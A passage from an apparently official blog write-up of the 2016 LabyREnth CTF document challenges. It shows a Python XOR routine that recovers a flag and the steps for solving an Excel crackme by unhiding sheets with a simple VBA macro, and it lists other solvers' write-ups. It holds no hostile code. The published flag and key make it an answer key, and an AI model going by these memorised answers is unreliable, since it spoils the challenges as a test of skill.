<p><a href="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled23.png"><img class="aligncenter size-large wp-image-17362" src="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled23-500x350.png" alt="Untitled23" width="500" height="350" srcset="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled23-500x350.png 500w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled23-230x161.png 230w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled23-428x300.png 428w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled23-57x40.png 57w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled23.png 544w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
<p>At this point it XoR’s the ‘d7KRoSK5UEDh35jJNkj0TtcJjOIbmBZlyCql’ function name by 144 and 85, takes the result of that and XoR’s it against the base-64 decoded value of ‘XJCR/DogZt7bduvvusJgAQu6QX9DmtKN+bZB’ to see if they match…which they won’t.</p>
<p>Since we know two parts of the puzzle, we can just work backwards to figure out what the initial second function name should be and go from there. We’ll base-64 decode the ‘XJCR’ string and ‘yRQa’ string, XoR them together, then XoR each resulting byte by 144 and 85.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f694c5aa65aa374517333" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&gt;&gt;&gt; a = base64.b64decode("yRQaQqmn4iZIgFxTHSbChaoJt9SxKmV7T1L5")
&gt;&gt;&gt; b = base64.b64decode("XJCR/DogZt7bduvvusJgAQu6QX9DmtKN+bZB")
&gt;&gt;&gt; c = ""
&gt;&gt;&gt; for index,value in enumerate(a):
...     c += chr((ord(value) ^ ord(b[index])) ^ 144 ^ 85)
...
&gt;&gt;&gt; c
'PAN{VBA=V3ryb!gAdv3n7ur3s!}'</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694c5aa65aa374517333-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c5aa65aa374517333-2">2</div><div class="crayon-num" data-line="crayon-5f694c5aa65aa374517333-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c5aa65aa374517333-4">4</div><div class="crayon-num" data-line="crayon-5f694c5aa65aa374517333-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c5aa65aa374517333-6">6</div><div class="crayon-num" data-line="crayon-5f694c5aa65aa374517333-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c5aa65aa374517333-8">8</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694c5aa65aa374517333-1"><span class="crayon-o">&gt;&gt;&gt;</span><span class="crayon-h"> </span><span class="crayon-v">a</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">base64</span><span class="crayon-sy">.</span><span class="crayon-e">b64decode</span><span class="crayon-sy">(</span><span class="crayon-s">"yRQaQqmn4iZIgFxTHSbChaoJt9SxKmV7T1L5"</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c5aa65aa374517333-2"><span class="crayon-o">&gt;&gt;&gt;</span><span class="crayon-h"> </span><span class="crayon-v">b</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">base64</span><span class="crayon-sy">.</span><span class="crayon-e">b64decode</span><span class="crayon-sy">(</span><span class="crayon-s">"XJCR/DogZt7bduvvusJgAQu6QX9DmtKN+bZB"</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f694c5aa65aa374517333-3"><span class="crayon-o">&gt;&gt;&gt;</span><span class="crayon-h"> </span><span class="crayon-v">c</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">""</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c5aa65aa374517333-4"><span class="crayon-o">&gt;&gt;&gt;</span><span class="crayon-h"> </span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-v">index</span><span class="crayon-sy">,</span><span class="crayon-e">value </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-e">enumerate</span><span class="crayon-sy">(</span><span class="crayon-v">a</span><span class="crayon-sy">)</span><span class="crayon-o">:</span></div><div class="crayon-line" id="crayon-5f694c5aa65aa374517333-5"><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">c</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-e">chr</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-e">ord</span><span class="crayon-sy">(</span><span class="crayon-v">value</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">^</span><span class="crayon-h"> </span><span class="crayon-e">ord</span><span class="crayon-sy">(</span><span class="crayon-v">b</span><span class="crayon-sy">[</span><span class="crayon-v">index</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">^</span><span class="crayon-h"> </span><span class="crayon-cn">144</span><span class="crayon-h"> </span><span class="crayon-o">^</span><span class="crayon-h"> </span><span class="crayon-cn">85</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c5aa65aa374517333-6"><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span></div><div class="crayon-line" id="crayon-5f694c5aa65aa374517333-7"><span class="crayon-o">&gt;&gt;&gt;</span><span class="crayon-h"> </span><span class="crayon-i">c</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c5aa65aa374517333-8"><span class="crayon-s">'PAN{VBA=V3ryb!gAdv3n7ur3s!}'</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0005 seconds] -->
<p></p>
<h3>Document 5 Challenge: EXCEL.EXE not just CALC.EXE</h3>
<p><em>Challenge Created By: Curtis Carmony </em><a href="https://twitter.com/c1fe" target="_blank"><em>@c1fe</em></a></p>
<p>We are given an Excel document that has a Crackme. When we try to test a key, a cheeky popup appears, tells us we are wrong, closes Excel, and launches calc.exe.</p>
<p><a href="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled24.png"><img class="aligncenter size-large wp-image-17365" src="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled24-500x85.png" alt="Untitled24" width="500" height="85" srcset="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled24-500x85.png 500w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled24-230x39.png 230w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled24-768x130.png 768w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled24-510x86.png 510w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled24-236x40.png 236w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled24.png 975w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
<p>When we open the document back up and look at the macros there is only one very simple macro to close the document, so there are definitely some shenanigans.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f694c5aa65ac852955192" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
Sub excelulate()

   Application.Quit

End Sub</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694c5aa65ac852955192-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c5aa65ac852955192-2">2</div><div class="crayon-num" data-line="crayon-5f694c5aa65ac852955192-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c5aa65ac852955192-4">4</div><div class="crayon-num" data-line="crayon-5f694c5aa65ac852955192-5">5</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694c5aa65ac852955192-1"><span class="crayon-e">Sub </span><span class="crayon-e">excelulate</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c5aa65ac852955192-2">&nbsp;</div><div class="crayon-line" id="crayon-5f694c5aa65ac852955192-3"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-v">Application</span><span class="crayon-sy">.</span><span class="crayon-e">Quit</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c5aa65ac852955192-4">&nbsp;</div><div class="crayon-line" id="crayon-5f694c5aa65ac852955192-5"><span class="crayon-st">End</span><span class="crayon-h"> </span><span class="crayon-v">Sub</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p>&nbsp;</p>
<p>If we right click on the sheets on the bottom and click unhide there is a secret hidden sheet.</p>
<p><a href="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled24-1.png"><img class="aligncenter size-large wp-image-17368" src="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled24-1-500x312.png" alt="Untitled24" width="500" height="312" srcset="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled24-1-500x312.png 500w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled24-1-230x144.png 230w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled24-1-480x300.png 480w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled24-1-64x40.png 64w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled24-1.png 655w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
<p>&nbsp;</p>
<p>If we go to the secret sheet, click “Show Formulas” and make the font black then we can see there are Excel functions in the cells. There is one cell that looks interesting at A14 that is referring to a super secret sheet that we cannot see.</p>
<p><a href="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled25.png"><img class="aligncenter size-large wp-image-17371" src="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled25-500x256.png" alt="Untitled25" width="500" height="256" srcset="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled25-500x256.png 500w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled25-230x118.png 230w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled25-768x393.png 768w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled25-510x261.png 510w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled25-78x40.png 78w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled25.png 975w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
<p>I modified the macro to try and make all of the sheets visible and clicked the button.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f694c5aa65af538100323" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
Sub excelulate()
Dim x As Worksheet
For Each x In Sheets
    x.Visible = True
Next
End Sub</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694c5aa65af538100323-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c5aa65af538100323-2">2</div><div class="crayon-num" data-line="crayon-5f694c5aa65af538100323-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c5aa65af538100323-4">4</div><div class="crayon-num" data-line="crayon-5f694c5aa65af538100323-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c5aa65af538100323-6">6</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694c5aa65af538100323-1"><span class="crayon-e">Sub </span><span class="crayon-e">excelulate</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c5aa65af538100323-2"><span class="crayon-i">Dim</span><span class="crayon-h"> </span><span class="crayon-i">x</span><span class="crayon-h"> </span><span class="crayon-st">As</span><span class="crayon-h"> </span><span class="crayon-e">Worksheet</span></div><div class="crayon-line" id="crayon-5f694c5aa65af538100323-3"><span class="crayon-st">For</span><span class="crayon-h"> </span><span class="crayon-st">Each</span><span class="crayon-h"> </span><span class="crayon-i">x</span><span class="crayon-h"> </span><span class="crayon-st">In</span><span class="crayon-h"> </span><span class="crayon-i">Sheets</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c5aa65af538100323-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">x</span><span class="crayon-sy">.</span><span class="crayon-v">Visible</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">True</span></div><div class="crayon-line" id="crayon-5f694c5aa65af538100323-5"><span class="crayon-e">Next</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c5aa65af538100323-6"><span class="crayon-st">End</span><span class="crayon-h"> </span><span class="crayon-v">Sub</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->
<p>We can now see a super secret sheet with more formulas. It is pretty amazing that there can be hidden and then super hidden sheets in Excel.</p>
<p><a href="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled26.png"><img class="aligncenter size-large wp-image-17374" src="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled26-500x237.png" alt="Untitled26" width="500" height="237" srcset="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled26-500x237.png 500w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled26-230x109.png 230w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled26-768x365.png 768w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled26-510x242.png 510w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled26-84x40.png 84w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled26.png 975w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
<p>If we remove uncheck “Show Formulas” and remove everything from F13 besides the concatenate function, Excel will print the formula for us.</p>
<p>=CONCATENATE(D7,A5,C5,B4,E20,B6,A8,B8,A12,B10,E10,C9,B13,D12,C11,B16,A25,A18,B19,C20,B21,B2,D23,B24,E4,B26,D16,A21,C14,A16)</p>
<p><a href="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled27.png"><img class="aligncenter size-large wp-image-17377" src="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled27-500x156.png" alt="Untitled27" width="500" height="156" srcset="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled27-500x156.png 500w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled27-230x72.png 230w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled27-768x240.png 768w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled27-510x160.png 510w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled27-128x40.png 128w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled27.png 975w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
<p>If we enter that key into the original file we get the winning message and find that we are the EXCELULATOR! It is pretty amazing all the things you can do with Excel.</p>
<p><a href="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled28.png"><img class="aligncenter size-large wp-image-17380" src="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled28-500x163.png" alt="Untitled28" width="500" height="163" srcset="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled28-500x163.png 500w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled28-230x75.png 230w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled28-768x250.png 768w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled28-510x166.png 510w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled28-123x40.png 123w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled28.png 975w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
<p>Leave a comment below to share your thoughts about these challenges. Be sure to also check out how other threat researchers solved these challenges:</p>
<h3>Document 1 Challenge</h3>
<ul>
<li><a href="https://dbheise.github.io/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-01/" target="_blank">https://dbheise.github.io/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-01/</a></li>
<li><a href="https://github.com/uafio/git/blob/master/scripts/labyREnth-2016/labyrenth-2016-docs-1.py" target="_blank">https://github.com/uafio/git/blob/master/scripts/labyREnth-2016/labyrenth-2016-docs-1.py</a></li>
</ul>
<h3>Document 2 Challenge</h3>
<ul>
<li><a href="https://dbheise.github.io/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-02/" target="_blank">https://dbheise.github.io/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-02/</a></li>
<li><a href="https://github.com/uafio/git/blob/master/scripts/labyREnth-2016/labyrenth-2016-docs-2.py" target="_blank">https://github.com/uafio/git/blob/master/scripts/labyREnth-2016/labyrenth-2016-docs-2.py</a></li>
</ul>
<h3>Document 3 Challenge</h3>
<ul>
<li><a href="https://dbheise.github.io/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-03/" target="_blank">https://dbheise.github.io/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-03/</a></li>
<li><a href="https://github.com/uafio/git/blob/master/scripts/labyREnth-2016/labyrenth-2016-docs-3.txt" target="_blank">https://github.com/uafio/git/blob/master/scripts/labyREnth-2016/labyrenth-2016-docs-3.txt</a></li>
</ul>
<h3>Document 4 Challenge</h3>
<ul>
<li><a href="https://dbheise.github.io/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-04/" target="_blank">https://dbheise.github.io/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-04/</a></li>
<li><u><a href="https://github.com/uafio/git/blob/master/scripts/labyREnth-2016/labyrenth-2016-docs-4.py" target="_blank">https://github.com/uafio/git/blob/master/scripts/labyREnth-2016/labyrenth-2016-docs-4.py</a></u></li>
</ul>
<h3>Document 5 Challenge</h3>
<ul>
<li><a href="https://dbheise.github.io/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-05/" target="_blank">https://dbheise.github.io/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-05/</a></li>
<li><a href="https://github.com/uafio/git/blob/master/scripts/labyREnth-2016/labyrenth-2016-docs-5.txt" target="_blank">https://github.com/uafio/git/blob/master/scripts/labyREnth-2016/labyrenth-2016-docs-5.txt</a></li>
</ul>
<p>&nbsp;</p>
</div>
            </div>

        </div>       
    </div>
  </article>


<script type="text/javascript">
    $('body').on('mouseover', '.idc_ul_cont_not_liked_inner', function(e) {
          $(this).find('svg').children('path').attr('stroke','#FF2E00');
          //$(this).attr('src','https://blog.paloaltonetworks.com/wp-content/themes/panwblog2020/dist/images/blue-like-icon.png');
      });
      $('body').on('mouseout', '.idc_ul_cont_not_liked_inner', function(e) {
          $(this).find('svg').children('path').attr('stroke','#000000');
          //$(this).attr('src','https://blog.paloaltonetworks.com/wp-content/themes/panwblog2020/dist/images/grey-like-icon.png');
      });
      
    $(document).ready(function(){
        //Moving single post page subscribe box one paragraph above from last
        var cont_width = $(".entry-content").width();
        cont_width = Math.round(cont_width/2);//
        var p_tag_found = false;
        var child_count = $( ".entry-content").children().length;
        var last_p_tag = ''; //2nd p tag 
        var p_tag_traverse_cnt = 0;
        var p_arr = [];
        var next_tag_is_image_container = false;
        for(var i = 0; i < child_count ; i++){
            var p_el = $('.entry-content').children().eq(i);
            /*
            var tag_name = $(p_el).prop('tagName');
            if(tag_name != 'UL' || tag_name == 'P'){
                continue
            }
            */
            
              var temp_text = $(p_el).html();
              temp_text = temp_text.trim();
              
              
              var found_in_child = $( p_el ).find( "img, iframe, video, figure" );
                
              if(temp_text == '&nbsp;' || temp_text == ''){
                 continue;
              }
              else{
                  p_arr.push(p_el);
              }
        }
        console.log(p_arr);
        

        $.each(p_arr, function (index,value) {
            
            if(next_tag_is_image_container){
                next_tag_is_image_container = false;
                return;
            }
            
            var found_img1 = $(p_arr[index]).find( "img, iframe, video, figure" );//finding any image
            var found_txt1 = $(p_arr[index]).text().trim();
            if(found_img1.length != 0 && found_txt1 == ''){//if image exists inside paragraph, with no sibling text
                return;
            }
                
                var p_el = value;
                var current_tag_name = $(p_el).prop('tagName');
                if(current_tag_name == 'IMG' || current_tag_name == 'IFRAME' || current_tag_name == 'VIDEO' || current_tag_name == 'FIGURE'){
                    return;
                }
              
              
                  p_tag_traverse_cnt++;
                  var next_of_p = p_arr[index+1];
                  var next_tag = $(next_of_p).prop('tagName');
                  
                  
                  if(p_tag_traverse_cnt == 3){
                      //If next element is UL, then add subscription box after UL
                      
                      //if next element is image or video, add the box after 3rd paragraph
                      
                      if(next_tag == 'IMG' || next_tag == 'IFRAME' || next_tag == 'VIDEO' || next_tag == 'FIGURE'){
                          //Check if image is not right aligned
                          var img_width = $(next_of_p).width();
                          
                          if(img_width > cont_width){//If image is not right aligned
                              next_tag_is_image_container = true;
                                return;
                          }
                          
                          
                      }
                      //Check if image or video exist as a child element
                      var found_in_child = $( next_of_p ).find( "img, iframe, video, figure" );
                      //console.log(found_in_child[0].width);
                      //console.log(found_in_child);
                      if(found_in_child.length != 0){
                             var img_width = found_in_child[0].width;
                             console.log(img_width+" "+cont_width);
                          if(img_width > cont_width){//If image is not right aligned
                              next_tag_is_image_container = true;
                                return;
                          }
                          
                      }
                      
                      if(next_tag == 'UL' && current_tag_name != 'UL'){
                          last_p_tag = next_of_p;
                          return false;    
                      }
                      else{
                          last_p_tag = p_el;
                          return false;    
                      }
                      
                  }    
                  if(p_tag_traverse_cnt > 3){
                       //If next element is UL, then add subscription box after UL
                      if(next_tag == 'UL' && current_tag_name != 'UL'){
                          last_p_tag = next_of_p;
                          return false;     
                      }
                      else{
                          last_p_tag = p_el;
                          return false;   
                      }
                  }
              
        });
        
        
        if(last_p_tag != ''){
            $( last_p_tag ).after('<div style="clear:both;"></div>',$('.subscribe-form-inner'));
        }
        // $( ".entry-content p:last-child" ).before($('.subscribe-form-inner'));
        
    });
    $('a').each(function() {
        if(this.id == 'share_btn'){
            return;
        }
        var a = new RegExp('/' + window.location.host + '/');
        if(!a.test(this.href)) {
            $(this).click(function(event) {
                event.preventDefault();
                event.stopPropagation();
                window.open(this.href, '_blank');
            });
        }
     });
     $('.comment-form-cookies-consent input[type=checkbox]').prop('checked','checked');
     //$('.form-submit input[type=submit]').after( '<img class="ajax-loader" style="display:none;" src="https://blog.paloaltonetworks.com/wp-content/themes/panwblog2020/dist/images/backgrounds/ajax-loader.gif" alt="Sending ...">' );
     //Hide manage subscription link
     
     if($('.subscribe-to-comments input[type=checkbox]').length == 0){
         $('.subscribe-to-comments').hide();
     }
     
          $('.form-submit input[type=submit]').attr('disabled',true);
          function enableCommentBtn(){
         $('.form-submit input[type=submit]').attr('disabled',false);
     }
     function disableCommentBtn(){
         $('.form-submit input[type=submit]').attr('disabled',true);
     }
    </script>
<div id="search-result-continer" style="display:none;min-height: 343px;">
    <!--<div id="search-result-heading" class="container-fluid container-breadcrumb"  data-aos="fade-in" style="display:none;">
       <div class="container-lg">
        <nav aria-label="breadcrumb">
          <ol class="breadcrumb">
              <li class="breadcrumb-item"><a href="https://blog.paloaltonetworks.com">Palo Alto Networks</a></li>
              <li class="breadcrumb-item search-term"></li>
          </ol>
        </nav>
       </div>
    </div>-->
    <div class="container-fluid container-feed-cards">
        <div class="container-lg">
            <div class="row row-feed">
                <div class="col col-feed">
                    
                    <div id="ajax_loader" class="text-center pb-40 pt-40">
                  <span>Loading...</span>
			</div>
      <div id="notfound2" class="text-center pt-40 pb-40" style="display: none;">Sorry, no results were found.</div>
      
                    <div class="row row-feed articles_container CoveoResultList" data-layout="list" data-wait-animation="fade" data-fields-to-include="@articlecategory, @articleauthor, @articlepublishedtime, @articlecategory, @articleauthorlink, @articledescription, @articlepostimage, @articlepublishedtimestring, @articleauthorimagelink, @articlepostid, @articlepostlength, @articlecategorylink, @uri" data-result-container-selector='#test_id' id="test_id">
                        <script id="customTemplate" type="text/underscore" class="result-template">
            <% JSON.stringify(raw) %>
              <article data-article-id="<% if(typeof raw.articlepostid !== "undefined") { print(raw.articlepostid); } %>" class="feed-card h-100 pan-coveo-search-list">
                <%if (typeof raw.articlepostimage =='undefined') { 
                    raw.articlepostimage = 'https://blog.paloaltonetworks.com/wp-content/uploads/2016/11/blog-generic-banner-1.jpg';
                 } %>
                        
                <%if (typeof raw.articlepostimage !='undefined') { %> 
                <div onclick="location.href='<%= raw.uri %>'" class="feed-card-thumbnail" style="background-image: url(<%= raw.articlepostimage %>);">
                <% if(typeof raw.articlepostid !== "undefined") { %>
                <!--<div class="total_number_view left-bottom"><span class="people-reacted<% if(typeof raw.articlepostid !== "undefined") { print(raw.articlepostid); } %>">#</span> people reacted</div>-->
                <% } %>
                  
                </div>
